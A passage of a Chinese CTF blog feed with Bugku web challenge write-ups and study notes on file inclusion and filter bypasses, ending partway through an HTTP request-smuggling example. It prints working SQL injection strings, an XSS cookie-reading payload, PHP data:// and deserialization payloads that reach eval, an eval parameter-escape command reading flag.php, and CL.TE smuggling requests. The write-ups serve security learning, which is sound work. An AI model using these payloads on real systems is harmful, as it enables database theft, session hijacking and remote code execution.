src="/2025/11/23/11.17-11.23bugku/image-20251123152410605.png"></p><p>5、在输入1’%a0union%a0select%a01,2,’3时，显示列数不匹配，于是增加一列1’%a0union%a0select%a01,2,3,’4，成功回显，说明列表有四列，但是这里只显示三列信息？应该是被隐藏了一列？</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123152645291.png"></p><p>6、尝试获取第四列的名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(column_name) from information_schema.columns where table_name=&#x27;pcnumber&#x27;),2,3,&#x27;4</span><br><span class="line"></span><br><span class="line">1&#x27;%a0union%a0select%a0(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#x27;pcnumber&#x27;),2,3,&#x27;4</span><br></pre></td></tr></table></figure><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123154011743.png"></p><p>7、知道是flag之后，尝试读取第四列的信息，应该就可以拿到flag了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(flag) from pcnumber),2,3,&#x27;4</span><br><span class="line"></span><br><span class="line">1&#x27;%a0union%a0select%a0(select%a0group_concat(flag)%a0from%a0pcnumber),2,3,&#x27;4</span><br></pre></td></tr></table></figure><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123155138334.png"></p><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sql中测试报错常用1、1&#x27;、1&quot;</span><br><span class="line">unionSQL 中的一个关键字，用于将两个或多个 SELECT 语句的结果集合并成一个结果集</span><br><span class="line">select从数据库表中查询（选择）数据</span><br><span class="line">group_concat()用于在 SELECT，UPDATE，DELETE 等语句中指定过滤条件</span><br><span class="line">whereMySQL中一个非常实用的聚合函数，作用是将一个分组内指定列的所有值连接成一个单一的字符串</span><br><span class="line">column_name columns 表中的一个字段，代表列的名称</span><br><span class="line">information_schema MySQL 数据库自带的一个系统数据库，它存储了关于所有其他数据库、表、列等的元数据信息</span><br><span class="line">columns information_schema 中的一个表，它记录了所有表的列信息</span><br></pre></td></tr></table></figure><h2 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h2><p>1、进入题目看到登录框和验证框，对提示进行md5计算后发现是0e开头，推测应该是md5弱比较，使用240610708即可过验证，用户名先随意输入admin试试</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123160116659.png"></p><p>2、多次输入不同密码后发现其将用户名进行输出，并且对密码不设验证，那考虑漏洞在用户名上，测试49、1’与1’’情况与前面相同，排除ssti与sql漏洞，于是尝试xss</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123160249064.png"></p><p>3、尝试之后发现确实是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123160831120.png"></p><p>4、知道是xss之后就卡住了，最后搜了才知道要使用document.cookie（中途想到题目叫cookies，还看了它的cookie，发现没东西）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123161254233.png"></p><h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;用于定义客户端脚本，它既可以包含脚本语句，也可以通过 src 属性引用外部脚本文件</span><br><span class="line">alert()JavaScript 的一个内置函数，用于显示一个包含指定消息和&quot;确定&quot;按钮的警告对话框</span><br><span class="line">document.cookieavaScript 属性，用于读取和设置与当前文档（网页）相关的 Cookie</span><br></pre></td></tr></table></figure><h2 id="Easy-Audit"><a href="#Easy-Audit" class="headerlink" title="Easy Audit"></a>Easy Audit</h2><p>1、进入题目看到一屏幕的代码(代码作用和绕过方法我写在&#x2F;&#x2F;后面了)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if($_REQUEST)&#123;</span><br><span class="line">    foreach ($_REQUEST as $key =&gt; $value) &#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))   die(&#x27;waf..&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;//遍历接收的所有变量，对其值进行检测，不允许有英文字符，但是根据其特性，同时存在post和get请求变量时post请求变量会将get请求变量覆盖掉，从而让get请求变量中存在英文字符绕过检测</span><br><span class="line"></span><br><span class="line">if($_SERVER)&#123;</span><br><span class="line">    if(preg_match(&#x27;/yulige|flag|nctf/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]))  die(&#x27;waf..&#x27;);</span><br><span class="line">&#125;//检测变量，不允许有yulige|flag|nctf这三个字符串，用编码绕过即可</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;yulige&#x27;]))&#123;</span><br><span class="line">    if(!(substr($_GET[&#x27;yulige&#x27;], 32) === md5($_GET[&#x27;yulige&#x27;])))&#123;</span><br><span class="line">        die(&#x27;waf..&#x27;);//yulinge变量从第32个字符之后开始算，其md5值要与其本身的md5相等，可以用数组进行绕过</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if(preg_match(&#x27;/nctfisfun$/&#x27;, $_GET[&#x27;nctf&#x27;]) &amp;&amp; $_GET[&#x27;nctf&#x27;] !== &#x27;nctfisfun&#x27;)&#123;</span><br><span class="line">            $getflag = file_get_contents($_GET[&#x27;flag&#x27;]);</span><br><span class="line">        &#125;//nctf变量中是否以nctfisfun结尾，但是不能只是nctfisfun，在前面加一个1即可</span><br><span class="line">        if(isset($getflag) &amp;&amp; $getflag === &#x27;ccc_liubi&#x27;)&#123;</span><br><span class="line">            include &#x27;flag.php&#x27;;</span><br><span class="line">            echo $flag;//上面一段接收了参数flag，并使用了file_get_contents这个文件读取函数，如果给flag传参ccc_liubi，而服务器上没有这个文件的话，就会返回给getflag空或者false，无法获取flag，可以使用data进行绕过，传flag=data://text/plain,ccc_liubi</span><br><span class="line">        &#125;else die(&#x27;waf..&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原始：yulige[]=1&amp;nctf=1nctfisfun&amp;flag=data://text/plain,ccc_liubi</span><br><span class="line"></span><br><span class="line">编码后：%79%75%6c%69%67%65[]=1&amp;%6e%63%74%66=1%6e%63%74%66isfun&amp;%66%6c%61%67=data://text/plain,ccc_liubi</span><br></pre></td></tr></table></figure><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123164216573.png"></p><h3 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach PHP 中专门用于遍历数组和对象的循环结构。它提供了一种简单、直观的方式来迭代数组中的每个元素</span><br><span class="line">$_REQUEST一个包含了 GET、POST 和 COOKIE 数据的超全局数组。它用于收集通过不同 HTTP 方法提交的表单数据，但是它的顺序优先级是cookie&gt;post&gt;get，所以如果同名的情况下，优先级高的会覆盖掉优先级低的</span><br><span class="line">data://text/plain允许在 URL 中直接嵌入数据的协议</span><br></pre></td></tr></table></figure><h2 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h2><p>1、进去之后显示</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123164425183.png"></p><p>于是dirsearch扫描了一下，发现有&#x2F;robots.txt</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123164350838.png"></p><p>2、进去查看之后发现被隐藏，不过可以在源码看见</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123164638271.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123164705006.png"></p><p>3、不过这是一个假的flag，在前面扫描的时候还有一个&#x2F;header.php，进行访问，显示许可被拒，F12查看之后发现cookie是false，</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123164929180.png"></p><p>4、修改为ture后，显示要使用PowerPC，于是修改User-Agent</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123164956133.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123165045033.png"></p><p>5、这串英文提示需要修改Accept</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123165141792.png"></p><p>6、修改Accept后成功得到flag</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123165727701.png"></p><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p>1、打开题目查看代码，代码要求get两个参数，一个fl，一个ag，fl要求包含英文字母或者数且后面需要跟一个(，ag则会在fl符合要求后被序列化，然后触发__destruct()，正则匹配ag中的字符，对于形如a()这种前有字符串，后有完整左右括号的进行循环匹配，在下面的eval(‘$a&#x3D;”‘.$this-&gt;cmd.’”;’)中，’.$this-&gt;cmd.’是被双引号包裹起来的，如果此时里面是一个变量形式，比如${phpinfo()}，则会执行phpinfo()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">//flag在flag.php里</span><br><span class="line">class flag</span><br><span class="line">&#123;</span><br><span class="line">    public $cmd=&#x27;index.php&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if (preg_match(&#x27;/\w+\((?R)?\)/&#x27;, $this-&gt;cmd))&#123;</span><br><span class="line">            eval(&#x27;$a=&quot;&#x27;.$this-&gt;cmd.&#x27;&quot;;&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            die(&#x27;hack!!!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (!isset($_GET[&#x27;fl&#x27;]) || !isset($_GET[&#x27;ag&#x27;])) &#123;</span><br><span class="line">    die(@highlight_file(&#x27;index.php&#x27;,true));</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    if (!(preg_match(&#x27;/[A-Za-z0-9]+\(/i&#x27;, $_GET[&#x27;fl&#x27;]))) &#123;</span><br><span class="line">        die(&#x27;hack!!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo unserialize($_GET[&#x27;ag&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>2、对其写一个脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class flag &#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">&#125;</span><br><span class="line">$a = new flag();</span><br><span class="line">$a-&gt;cmd = &#x27;$&#123;phpinfo()&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">$payload = serialize(array($a));//用数组是因为不用数组生成的payload传上去之后显示为空白，没有内容</span><br><span class="line">echo  $payload;</span><br></pre></td></tr></table></figure><p>生成payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">脚本生成的ag：a:1:&#123;i:0;O:4:&quot;flag&quot;:1:&#123;s:3:&quot;cmd&quot;;s:12:&quot;$&#123;phpinfo()&#125;&quot;;&#125;&#125;</span><br><span class="line"></span><br><span class="line">完整传参?fl=a(&amp;ag=a:1:&#123;i:0;O:4:&quot;flag&quot;:1:&#123;s:3:&quot;cmd&quot;;s:12:&quot;$&#123;phpinfo()&#125;&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后搜索flag即可得到，不需要去flag.php里面寻找，而且如果把phpinfo()替换成cat、highlight_file等命令，会被过滤，显示hacker</p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123172516576.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123173850501.png"></p><p><img src="/2025/11/23/11.17-11.23bugku/image-20251123173921224.png"></p><h3 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 PHP 双引号字符串中，$&#123;&#125; 会被解析并执行其中的代码</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;时间&quot;&gt;&lt;a href=&quot;#时间&quot; class=&quot;headerlink&quot; title=&quot;时间&quot;&gt;&lt;/a&gt;时间&lt;/h2&gt;&lt;p&gt;11.17-11.23&lt;/p&gt;
&lt;h2 id=&quot;ssti&quot;&gt;&lt;a href=&quot;#ssti&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="CTF" scheme="https://aihenai.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="https://aihenai.github.io/tags/web/"/>
    
    <category term="wp" scheme="https://aihenai.github.io/tags/wp/"/>
    
    <category term="note" scheme="https://aihenai.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>文件包含学习笔记</title>
    <link href="https://aihenai.github.io/2025/11/14/LFI-RFI/"/>
    <id>https://aihenai.github.io/2025/11/14/LFI-RFI/</id>
    <published>2025-11-13T16:00:00.000Z</published>
    <updated>2025-12-07T12:54:00.347Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LFI与RFI"><a href="#LFI与RFI" class="headerlink" title="LFI与RFI"></a>LFI与RFI</h2><p>文件包含分本地文件包含(LFI)和远程文件包含(RFI)。</p><p>如果php.ini配置文件中allow_url_fopen和allow_url_include都为Off，就无法远程包含文件。</p><p>在PHP4中RFI与LFI都存在，而到了PHP5.2.0之后，allow_url_include默认条件下为Off，无法远程包含文件，所以主要是本地文件包含。</p><h2 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">include() ：包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个php文件继续执行。</span><br><span class="line"></span><br><span class="line">include_once()：跟include函数作用几乎相同，只是会在导入函数之前先检测该文件是否被导入。如果已经执行一遍就不重复执行。</span><br><span class="line"></span><br><span class="line">require()：跟include唯一不同的是，当产生错误时候，include会继续运行而require停止运行。</span><br><span class="line"></span><br><span class="line">require_once()：与include_once()相同，先检测，如果已经存在就不会重复执行。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>文件包含漏洞是代码注入的一种。其原理就是注入一段用户能控制的脚本或代码，并让服务器端执行，代码注入的典型代表就是文件包含。服务器通过函数去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到目的。</p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>1、allow_url_fopen&#x3D;On</p><p>2、有动态变量可以控制</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>1、<strong>获取绝对路径</strong>：可以随便包含一个不存在的文件来引发报错，在报错信息里会显示绝对路径。</p><p>2、<strong>包含用户上传的文件</strong>：比如我们自己上传的一句话木马。</p><p>3、<strong>包含伪协议</strong>：data、php、file等。</p><p>4、<strong>包含Session 文件</strong>：通过Session变量写入恶意代码，然后找到路径，包含这个文件，执行命令。</p><p>5、<strong>包含日志文件</strong>：通过构造语句让服务器报错并将一句话随报错信息写入日志，然后找到日志文件路径，包含此文件，用工具连接，拿下网站的Webshell</p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>1、allow_url_include&#x3D;On</p><p>2、有动态变量可以控制</p><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><p>1、远程包含其他服务器上配置好的恶意文件：在我们可以控制的服务器上提前配置好一个我们想要的恶意文件，将文件在服务器下的路径作为参数传进去，目标服务器接收到之后就会自动下载并执行这个恶意文件。</p><p>2、使用协议包装：使用php:&#x2F;&#x2F;input然后发送post请求、data:&#x2F;&#x2F;数据流等直接包含恶意代码进去。</p><h2 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h2><h3 id="常见日志路径"><a href="#常见日志路径" class="headerlink" title="常见日志路径"></a>常见日志路径</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/nginx/access.log  </span><br><span class="line">/var/log/httpd/access_log</span><br></pre></td></tr></table></figure><h3 id="常见session文件路径"><a href="#常见session文件路径" class="headerlink" title="常见session文件路径"></a>常见session文件路径</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sessions/sess_[PHPSESSID]</span><br><span class="line">/var/lib/php5/sessions/sess_[PHPSESSID] </span><br><span class="line">/tmp/sess_[PHPSESSID]</span><br><span class="line">/var/lib/php7.4/sessions/sess_[PHPSESSID]</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;LFI与RFI&quot;&gt;&lt;a href=&quot;#LFI与RFI&quot; class=&quot;headerlink&quot; title=&quot;LFI与RFI&quot;&gt;&lt;/a&gt;LFI与RFI&lt;/h2&gt;&lt;p&gt;文件包含分本地文件包含(LFI)和远程文件包含(RFI)。&lt;/p&gt;
&lt;p&gt;如果php.ini配置文件</summary>
      
    
    
    
    <category term="CTF" scheme="https://aihenai.github.io/categories/CTF/"/>
    
    
    <category term="web" scheme="https://aihenai.github.io/tags/web/"/>
    
    <category term="note" scheme="https://aihenai.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>绕过学习笔记</title>
    <link href="https://aihenai.github.io/2025/11/12/Bypass/"/>
    <id>https://aihenai.github.io/2025/11/12/Bypass/</id>
    <published>2025-11-11T16:00:00.000Z</published>
    <updated>2025-12-07T12:53:32.486Z</updated>
    
    <content type="html"><![CDATA[<h2 id="字符绕过"><a href="#字符绕过" class="headerlink" title="字符绕过"></a>字符绕过</h2><h3 id="1、大小写绕过"><a href="#1、大小写绕过" class="headerlink" title="1、大小写绕过"></a>1、大小写绕过</h3><h3 id="2、双写绕过"><a href="#2、双写绕过" class="headerlink" title="2、双写绕过"></a>2、双写绕过</h3><h3 id="3、通配符绕过"><a href="#3、通配符绕过" class="headerlink" title="3、通配符绕过"></a>3、通配符绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*</span><br></pre></td></tr></table></figure><h3 id="4、反斜杠转义绕过"><a href="#4、反斜杠转义绕过" class="headerlink" title="4、反斜杠转义绕过"></a>4、反斜杠转义绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\</span><br></pre></td></tr></table></figure><h3 id="5、字符串拼接"><a href="#5、字符串拼接" class="headerlink" title="5、字符串拼接"></a>5、字符串拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+</span><br><span class="line">|</span><br></pre></td></tr></table></figure><h3 id="6、参数逃逸"><a href="#6、参数逃逸" class="headerlink" title="6、参数逃逸"></a>6、参数逃逸</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">假设一串代码如下：</span><br><span class="line">&lt;?php </span><br><span class="line">  $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">  if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |/i&quot;,$c))   //这里还过滤的.和空格</span><br><span class="line">  &#123;</span><br><span class="line">      eval($c);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们可以构造另一个参数来绕过：</span><br><span class="line">url?c=eval($_GET[&#x27;a&#x27;]);&amp;a=cat flag.php;</span><br></pre></td></tr></table></figure><h3 id="7、空白符合绕过"><a href="#7、空白符合绕过" class="headerlink" title="7、空白符合绕过"></a>7、空白符合绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">制表符 (%09)</span><br><span class="line">换行符 (%0a)</span><br><span class="line">回车符 (%0d)</span><br><span class="line">垂直制表符 (%0b)</span><br></pre></td></tr></table></figure><h3 id="8、内联注释-MySQL特有"><a href="#8、内联注释-MySQL特有" class="headerlink" title="8、内联注释 (MySQL特有)"></a>8、内联注释 (MySQL特有)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：uni/**/on</span><br></pre></td></tr></table></figure><h3 id="9、空格绕过"><a href="#9、空格绕过" class="headerlink" title="9、空格绕过"></a>9、空格绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在Linux中，空格可以替换为以下几种：</span><br><span class="line">$IFSShell的内部字段分隔符变量</span><br><span class="line">$&#123;IFS&#125;更规范的变量引用方式</span><br><span class="line">$IFS$9 或 $IFS$1$9代表第9个参数，常为空字符串，用于截断后续内容</span><br><span class="line">&lt;&gt;以读写方式打开文件，同样可替代空格</span><br><span class="line">%20常用于URL场景，代表空格</span><br><span class="line">%09常用于URL场景，代表制表符(Tab)</span><br></pre></td></tr></table></figure><h3 id="10、空字符截断"><a href="#10、空字符截断" class="headerlink" title="10、空字符截断"></a>10、空字符截断</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在PHP版本小于5.3.4时可以尝试使用%00进行截断</span><br></pre></td></tr></table></figure><h3 id="11、目录遍历绕过"><a href="#11、目录遍历绕过" class="headerlink" title="11、目录遍历绕过"></a>11、目录遍历绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../</span><br></pre></td></tr></table></figure><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="1、Base64编码绕过"><a href="#1、Base64编码绕过" class="headerlink" title="1、Base64编码绕过"></a>1、Base64编码绕过</h3><h3 id="2、URL编码绕过"><a href="#2、URL编码绕过" class="headerlink" title="2、URL编码绕过"></a>2、URL编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可双重编码绕过，因为有些只解码一次</span><br></pre></td></tr></table></figure><h3 id="3、Unicode编码绕过"><a href="#3、Unicode编码绕过" class="headerlink" title="3、Unicode编码绕过"></a>3、Unicode编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要用于绕过对特定字符的过滤</span><br></pre></td></tr></table></figure><h3 id="4、16进制编码绕过"><a href="#4、16进制编码绕过" class="headerlink" title="4、16进制编码绕过"></a>4、16进制编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在SQL注入中经常用于绕过对字符串的检测</span><br></pre></td></tr></table></figure><h3 id="5、HTML编码绕过"><a href="#5、HTML编码绕过" class="headerlink" title="5、HTML编码绕过"></a>5、HTML编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要用于绕过XSS过滤</span><br></pre></td></tr></table></figure><h2 id="协议绕过"><a href="#协议绕过" class="headerlink" title="协议绕过"></a>协议绕过</h2><h3 id="1、HTTP参数污染"><a href="#1、HTTP参数污染" class="headerlink" title="1、HTTP参数污染"></a>1、HTTP参数污染</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同一个参数名，在一次上传时同时赋予多个值，如：</span><br><span class="line">?id=1&amp;id=2</span><br><span class="line">可能只会判定前一个id=1而忽略后面的id=2</span><br></pre></td></tr></table></figure><h3 id="2、HTTP请求走私"><a href="#2、HTTP请求走私" class="headerlink" title="2、HTTP请求走私"></a>2、HTTP请求走私</h3><p>利用前后端对请求头部处理的边界不同，使请求被解析成了两个不同的完整请求<br>Content-Length 头部（CL)<br>Transfer-Encoding 头部(TE)</p><p><strong>1、CL.TE 走私</strong><br>原理：前端服务器信任 Content-Length 头部，而后端服务器信任 Transfer-Encoding 头部。<br>攻击Payload构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure><p>前端视角：看到 CL&#x3D;13，它会将整个Body（即 0\r\n\r\nSMUGGLED，共13个字节）转发给后端。<br>后端视角：看到 TE: chunked，它开始解析分块。第一块是 0，表示结束。所以它认为第一个请求到此为止。<br>结果：字节 SMUGGLED 没有被后端当作第一个请求的一部分，而是被留在了缓冲区内，成为了下一个请求的开头。</p><p><strong>2、TE.CL 走私</strong><br>原理：前端服务器信任 Transfer-Encoding 头部，而后端服务器信任 Content-Length 头部。<br>攻击Payload构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span 